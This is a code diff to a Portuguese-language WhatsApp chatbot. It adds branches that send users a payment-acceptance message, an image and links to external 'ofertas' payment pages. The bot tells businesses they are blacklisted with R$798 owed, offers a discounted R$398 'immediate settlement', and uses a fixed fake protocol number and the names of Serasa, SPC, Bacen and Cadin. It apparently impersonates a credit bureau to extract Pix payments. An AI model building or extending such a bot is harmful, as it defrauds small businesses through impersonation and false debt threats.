@@ -323,6 +323,11 @@ async function processarMensagens(msg) {
     const msgErroTjsp = '⚠️ *Processo não localizado na base pública!*\n\n_Entre em contato com o consultor e solicite uma chave válida!_';
     const tjspKey = '129300000BLT14';
     const mensagemCartao = '⚠️ *Sua empresa está NEGATIVADA!*\n\n➡️ A credora reivindica valores pendentes referentes aos serviços disponibilizados no aparelho, realizados por meio de crédito e débito.\nO valor fixado pela credora reclamante é de *R$798,00.*\n\n💡 Está sendo liberado uma ordem de pagamento pelo Feirão!\nLiquide já a sua pendência pelo valor de *R$398,00* com *QUITAÇÃO IMEDIATA!*\n\n➡️ *129300000BLT14* é o número do protocolo de anuências.\nApós o pagamento sua dívida junto à bandeira de cartão credora e à Serasa será dada baixa.\nE também sua empresa estará assegurada de apontamento no Score, Cadin Federal, CNPJ, Bacen e SPC.';
+    const msgPix = '✅ *Seu acordo foi aceito!*\n\nAcesse a página através do link na próxima mensagem para realizar o pagamendo com o desconto do *Feirão!*';
+    const linkPixUm = 'https://atentus.com.br/eva/serasanovo/serasabot/public/ofertas.html';
+    const linkPixDois = 'https://atentus.com.br/eva/serasanovo/serasabot/public/ofertas2.html';
+    const imagemPix = MessageMedia.fromFilePath('./assets/img_pix.jpg');
+
     const MAX_ATTEMPTS = 3;
     
     if (!state[from]) state[from] = { attempts: 0, step: 0 };
@@ -699,11 +704,25 @@ async function processarMensagens(msg) {
                 await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
                 state[from] = { step: 3 };
 
+            }else if(pixUm === 'true'){
+                await enviarMensagemInicial(imagemBaixado, `📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* Seu título foi baixado com sucesso.`);
+                enviarMensagemInicial(imagemPix, msgPix);
+                enviarMensagemTexto(linkPixUm);
+                await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+                state[from] = { step: 3 };
+
+            }else if(pixDois === 'true'){
+                await enviarMensagemInicial(imagemBaixado, `📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* Seu título foi baixado com sucesso.`);
+                enviarMensagemInicial(imagemPix, msgPix);
+                enviarMensagemTexto(linkPixDois);
+                await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+                state[from] = { step: 3 };
+                
             }else{
                 await enviarMensagemTexto(`📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* ${mensagemCliente}`);
                 await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
                 state[from] = { step: 3 };
-        } 
+            }
     
           });
         return;
